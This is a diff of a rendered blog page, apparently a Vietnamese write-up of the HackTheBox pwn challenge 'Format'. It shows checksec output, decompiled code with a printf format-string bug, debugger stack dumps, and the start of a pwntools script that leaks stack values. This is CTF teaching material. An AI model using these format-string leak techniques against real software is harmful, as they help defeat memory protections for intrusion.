@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.498676c34eb225e85357ab0ce19c3c1244f3bd0bf595e5684d1b9d50ea4fbc42.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1368,16 +1368,14 @@
 
     
   
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G6WT3WSKMH"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-G6WT3WSKMH', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G6WT3WSKMH', { 'anonymize_ip': false });
 }
 </script>
 
@@ -1715,7 +1713,7 @@ if (!doNotTrack) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1724,14 +1722,14 @@ if (!doNotTrack) {
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ checksec format  
-<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ checksec format  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Dễ dàng thấy hầu hết các cơ chế bảo mật đều được bật ở trên tệp tin này.</li>
@@ -1739,22 +1737,22 @@ if (!doNotTrack) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ ./format
-%x.%x.%x.%x
-f0623a03.0.f0549142.3a1b8000
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ ./format
+</span></span><span class="line"><span class="cl">%x.%x.%x.%x
+</span></span><span class="line"><span class="cl">f0623a03.0.f0549142.3a1b8000
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Ta mở bằng ghidra:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1771,26 +1769,26 @@ f0623a03.0.f0549142.3a1b8000
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
-  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
-  
-  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
-  <span class="n">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
-  <span class="n">echo</span><span class="p">();</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
-                    <span class="cm">/* WARNING: Subroutine does not return */</span>
-    <span class="n">__stack_chk_fail</span><span class="p">();</span>
-  <span class="p">}</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">echo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1805,20 +1803,20 @@ f0623a03.0.f0549142.3a1b8000
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">echo</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
-  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
-  
-  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
-  <span class="k">do</span> <span class="p">{</span>
-    <span class="n">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="n">local_118</span><span class="p">);</span>
-  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">echo</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">local_118</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Lỗi này cho phép chúng ta đọc được dữ liệu trên stack.</li>
@@ -1826,7 +1824,7 @@ f0623a03.0.f0549142.3a1b8000
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1879,65 +1877,65 @@ f0623a03.0.f0549142.3a1b8000
 </span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; x/100gx <span class="nv">$rsp</span>
-0x7fffffffdc10:	0x4141414141414141	0x4141414141414141
-0x7fffffffdc20:	0x0000000a61414141	0x0000038000000380
-0x7fffffffdc30:	0x0000038000000380	0x0000038000000380
-0x7fffffffdc40:	0x0000038000000380	0x0000038000000380
-0x7fffffffdc50:	0x0000038000000380	0x0000038000000380
-0x7fffffffdc60:	0x0000038000000380	0x0000038000000380
-0x7fffffffdc70:	0x0000038000000380	0x0000038000000380
-0x7fffffffdc80:	0x0000000000000000	0x00007ffff7fa85c0
-0x7fffffffdc90:	0x0000000000000000	0x00007ffff7e516a5
-0x7fffffffdca0:	0x0000000000000000	0x00007ffff7fa85c0
-0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
-0x7fffffffdcc0:	0x00007ffff7fa94a0	0x00007ffff7e4d6bd
-0x7fffffffdcd0:	0x00007ffff7fa85c0	0x00007ffff7e43f65
-0x7fffffffdce0:	0x00005555555552d0	0x00007fffffffdd20
-0x7fffffffdcf0:	0x00005555555550c0	0x00007fffffffde30
-0x7fffffffdd00:	0x0000000000000000	0x000055555555526d
-0x7fffffffdd10:	0x00007ffff7facfc8	0xc53e05bd2bae9300
-0x7fffffffdd20:	0x00007fffffffdd40	0x00005555555552b3
-0x7fffffffdd30:	0x00007fffffffde30	0xc53e05bd2bae9300
-0x7fffffffdd40:	0x0000000000000000	0x00007ffff7de30b3
-0x7fffffffdd50:	0x00007ffff7ffc620	0x00007fffffffde38
-0x7fffffffdd60:	0x0000000100000000	0x0000555555555284
-0x7fffffffdd70:	0x00005555555552d0	0xbca385af5106ab45
-0x7fffffffdd80:	0x00005555555550c0	0x00007fffffffde30
-0x7fffffffdd90:	0x0000000000000000	0x0000000000000000
-0x7fffffffdda0:	0x435c7a50eba6ab45	0x435c6a1331c8ab45
-0x7fffffffddb0:	0x0000000000000000	0x0000000000000000
-0x7fffffffddc0:	0x0000000000000000	0x0000000000000001
-0x7fffffffddd0:	0x00007fffffffde38	0x00007fffffffde48
-0x7fffffffdde0:	0x00007ffff7ffe190	0x0000000000000000
-0x7fffffffddf0:	0x0000000000000000	0x00005555555550c0
-0x7fffffffde00:	0x00007fffffffde30	0x0000000000000000
-0x7fffffffde10:	0x0000000000000000	0x00005555555550ee
-0x7fffffffde20:	0x00007fffffffde28	0x000000000000001c
-0x7fffffffde30:	0x0000000000000001	0x00007fffffffe1be
-0x7fffffffde40:	0x0000000000000000	0x00007fffffffe1fa
-0x7fffffffde50:	0x00007fffffffe206	0x00007fffffffe214
-0x7fffffffde60:	0x00007fffffffe227	0x00007fffffffe23c
-0x7fffffffde70:	0x00007fffffffe244	0x00007fffffffe256
-0x7fffffffde80:	0x00007fffffffe292	0x00007fffffffe29a
-0x7fffffffde90:	0x00007fffffffe2b1	0x00007fffffffe2cd
-0x7fffffffdea0:	0x00007fffffffe2ed	0x00007fffffffe309
-0x7fffffffdeb0:	0x00007fffffffe329	0x00007fffffffe334
-0x7fffffffdec0:	0x00007fffffffe344	0x00007fffffffe356
-0x7fffffffded0:	0x00007fffffffe3b2	0x00007fffffffe3d0
-0x7fffffffdee0:	0x00007fffffffe3e4	0x00007fffffffe41a
-0x7fffffffdef0:	0x00007fffffffe42c	0x00007fffffffe43b
-0x7fffffffdf00:	0x00007fffffffe479	0x00007fffffffe490
-0x7fffffffdf10:	0x00007fffffffe4c3	0x00007fffffffe4da
-0x7fffffffdf20:	0x00007fffffffe4ea	0x00007fffffffe4fe
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; x/100gx <span class="nv">$rsp</span>
+</span></span><span class="line"><span class="cl">0x7fffffffdc10:	0x4141414141414141	0x4141414141414141
+</span></span><span class="line"><span class="cl">0x7fffffffdc20:	0x0000000a61414141	0x0000038000000380
+</span></span><span class="line"><span class="cl">0x7fffffffdc30:	0x0000038000000380	0x0000038000000380
+</span></span><span class="line"><span class="cl">0x7fffffffdc40:	0x0000038000000380	0x0000038000000380
+</span></span><span class="line"><span class="cl">0x7fffffffdc50:	0x0000038000000380	0x0000038000000380
+</span></span><span class="line"><span class="cl">0x7fffffffdc60:	0x0000038000000380	0x0000038000000380
+</span></span><span class="line"><span class="cl">0x7fffffffdc70:	0x0000038000000380	0x0000038000000380
+</span></span><span class="line"><span class="cl">0x7fffffffdc80:	0x0000000000000000	0x00007ffff7fa85c0
+</span></span><span class="line"><span class="cl">0x7fffffffdc90:	0x0000000000000000	0x00007ffff7e516a5
+</span></span><span class="line"><span class="cl">0x7fffffffdca0:	0x0000000000000000	0x00007ffff7fa85c0
+</span></span><span class="line"><span class="cl">0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
+</span></span><span class="line"><span class="cl">0x7fffffffdcc0:	0x00007ffff7fa94a0	0x00007ffff7e4d6bd
+</span></span><span class="line"><span class="cl">0x7fffffffdcd0:	0x00007ffff7fa85c0	0x00007ffff7e43f65
+</span></span><span class="line"><span class="cl">0x7fffffffdce0:	0x00005555555552d0	0x00007fffffffdd20
+</span></span><span class="line"><span class="cl">0x7fffffffdcf0:	0x00005555555550c0	0x00007fffffffde30
+</span></span><span class="line"><span class="cl">0x7fffffffdd00:	0x0000000000000000	0x000055555555526d
+</span></span><span class="line"><span class="cl">0x7fffffffdd10:	0x00007ffff7facfc8	0xc53e05bd2bae9300
+</span></span><span class="line"><span class="cl">0x7fffffffdd20:	0x00007fffffffdd40	0x00005555555552b3
+</span></span><span class="line"><span class="cl">0x7fffffffdd30:	0x00007fffffffde30	0xc53e05bd2bae9300
+</span></span><span class="line"><span class="cl">0x7fffffffdd40:	0x0000000000000000	0x00007ffff7de30b3
+</span></span><span class="line"><span class="cl">0x7fffffffdd50:	0x00007ffff7ffc620	0x00007fffffffde38
+</span></span><span class="line"><span class="cl">0x7fffffffdd60:	0x0000000100000000	0x0000555555555284
+</span></span><span class="line"><span class="cl">0x7fffffffdd70:	0x00005555555552d0	0xbca385af5106ab45
+</span></span><span class="line"><span class="cl">0x7fffffffdd80:	0x00005555555550c0	0x00007fffffffde30
+</span></span><span class="line"><span class="cl">0x7fffffffdd90:	0x0000000000000000	0x0000000000000000
+</span></span><span class="line"><span class="cl">0x7fffffffdda0:	0x435c7a50eba6ab45	0x435c6a1331c8ab45
+</span></span><span class="line"><span class="cl">0x7fffffffddb0:	0x0000000000000000	0x0000000000000000
+</span></span><span class="line"><span class="cl">0x7fffffffddc0:	0x0000000000000000	0x0000000000000001
+</span></span><span class="line"><span class="cl">0x7fffffffddd0:	0x00007fffffffde38	0x00007fffffffde48
+</span></span><span class="line"><span class="cl">0x7fffffffdde0:	0x00007ffff7ffe190	0x0000000000000000
+</span></span><span class="line"><span class="cl">0x7fffffffddf0:	0x0000000000000000	0x00005555555550c0
+</span></span><span class="line"><span class="cl">0x7fffffffde00:	0x00007fffffffde30	0x0000000000000000
+</span></span><span class="line"><span class="cl">0x7fffffffde10:	0x0000000000000000	0x00005555555550ee
+</span></span><span class="line"><span class="cl">0x7fffffffde20:	0x00007fffffffde28	0x000000000000001c
+</span></span><span class="line"><span class="cl">0x7fffffffde30:	0x0000000000000001	0x00007fffffffe1be
+</span></span><span class="line"><span class="cl">0x7fffffffde40:	0x0000000000000000	0x00007fffffffe1fa
+</span></span><span class="line"><span class="cl">0x7fffffffde50:	0x00007fffffffe206	0x00007fffffffe214
+</span></span><span class="line"><span class="cl">0x7fffffffde60:	0x00007fffffffe227	0x00007fffffffe23c
+</span></span><span class="line"><span class="cl">0x7fffffffde70:	0x00007fffffffe244	0x00007fffffffe256
+</span></span><span class="line"><span class="cl">0x7fffffffde80:	0x00007fffffffe292	0x00007fffffffe29a
+</span></span><span class="line"><span class="cl">0x7fffffffde90:	0x00007fffffffe2b1	0x00007fffffffe2cd
+</span></span><span class="line"><span class="cl">0x7fffffffdea0:	0x00007fffffffe2ed	0x00007fffffffe309
+</span></span><span class="line"><span class="cl">0x7fffffffdeb0:	0x00007fffffffe329	0x00007fffffffe334
+</span></span><span class="line"><span class="cl">0x7fffffffdec0:	0x00007fffffffe344	0x00007fffffffe356
+</span></span><span class="line"><span class="cl">0x7fffffffded0:	0x00007fffffffe3b2	0x00007fffffffe3d0
+</span></span><span class="line"><span class="cl">0x7fffffffdee0:	0x00007fffffffe3e4	0x00007fffffffe41a
+</span></span><span class="line"><span class="cl">0x7fffffffdef0:	0x00007fffffffe42c	0x00007fffffffe43b
+</span></span><span class="line"><span class="cl">0x7fffffffdf00:	0x00007fffffffe479	0x00007fffffffe490
+</span></span><span class="line"><span class="cl">0x7fffffffdf10:	0x00007fffffffe4c3	0x00007fffffffe4da
+</span></span><span class="line"><span class="cl">0x7fffffffdf20:	0x00007fffffffe4ea	0x00007fffffffe4fe
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Chúng ta thấy có 1 vài giá trị có địa chỉ là <code>0x5555***</code> trên stack. Kiểm tra các giá trị này với lệnh <code>x/i dia_chi</code></li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1949,24 +1947,24 @@ f0623a03.0.f0549142.3a1b8000
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; x/i 0x00005555555552d0
-   0x5555555552d0 &lt;__libc_csu_init&gt;:	endbr64 
-pwndbg&gt; x/i 0x00005555555550c0
-   0x5555555550c0 &lt;_start&gt;:	endbr64 
-pwndbg&gt; x/i 0x000055555555526d
-   0x55555555526d &lt;init+117&gt;:	nop
-pwndbg&gt; x/i 0x00005555555552b3
-   0x5555555552b3 &lt;main+47&gt;:	mov    eax,0x0
-pwndbg&gt; x/i 0x00005555555550ee
-   0x5555555550ee &lt;_start+46&gt;:	hlt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; x/i 0x00005555555552d0
+</span></span><span class="line"><span class="cl">   0x5555555552d0 &lt;__libc_csu_init&gt;:	endbr64 
+</span></span><span class="line"><span class="cl">pwndbg&gt; x/i 0x00005555555550c0
+</span></span><span class="line"><span class="cl">   0x5555555550c0 &lt;_start&gt;:	endbr64 
+</span></span><span class="line"><span class="cl">pwndbg&gt; x/i 0x000055555555526d
+</span></span><span class="line"><span class="cl">   0x55555555526d &lt;init+117&gt;:	nop
+</span></span><span class="line"><span class="cl">pwndbg&gt; x/i 0x00005555555552b3
+</span></span><span class="line"><span class="cl">   0x5555555552b3 &lt;main+47&gt;:	mov    eax,0x0
+</span></span><span class="line"><span class="cl">pwndbg&gt; x/i 0x00005555555550ee
+</span></span><span class="line"><span class="cl">   0x5555555550ee &lt;_start+46&gt;:	hlt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Mặt khác, lỗi format-string có thể cho phép chúng ta dump dữ liệu trên stack. Chúng ta sẽ viết 1 đoạn code nhỏ để dump dữ liệu từ stack ra.</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2010,56 +2008,56 @@ pwndbg&gt; x/i 0x00005555555550ee
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="c1"># HOST = &#39;64.227.36.245&#39;</span>
-<span class="c1"># PORT = 30730</span>
-
-<span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
-
-<span class="c1"># -----------------------</span>
-<span class="k">def</span> <span class="nf">com</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
-	<span class="k">global</span> <span class="n">r</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">):</span>
-		<span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-
-
-<span class="k">def</span> <span class="nf">nonStopLeak</span><span class="p">():</span>
-	<span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
-	<span class="n">min_val</span> <span class="o">=</span> <span class="mi">1</span>
-	<span class="n">max_val</span> <span class="o">=</span> <span class="mi">50</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Starting nonStopLeaking (range: </span><span class="si">%d</span><span class="s2"> to </span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">))</span>
-	<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;EMPTY ON PURPOSE&#34;</span><span class="p">)</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">):</span>
-		<span class="n">leak</span> <span class="o">=</span> <span class="s2">&#34;%{}$lx&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-		<span class="n">leak</span> <span class="o">=</span> <span class="n">com</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-		<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
-
-	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;nonStopLeaking finalized...&#34;</span><span class="p">)</span>
-	<span class="k">return</span> <span class="n">data</span>
-
-
-<span class="c1"># -------------- exploit -----------------------</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;format&#34;</span><span class="p">)</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./format&#34;</span><span class="p">)</span>
-<span class="c1"># input(&#34;[+] attach gdb&#34;)</span>
-<span class="c1"># Launch the fmtstr exploiter</span>
-<span class="n">exploiter</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">com</span><span class="p">)</span>
-
-<span class="n">collected_data</span> <span class="o">=</span> <span class="n">nonStopLeak</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">collected_data</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># HOST = &#39;64.227.36.245&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># PORT = 30730</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">com</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nonStopLeak</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">	<span class="n">min_val</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">	<span class="n">max_val</span> <span class="o">=</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl">	<span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Starting nonStopLeaking (range: </span><span class="si">%d</span><span class="s2"> to </span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;EMPTY ON PURPOSE&#34;</span><span class="p">)</span>
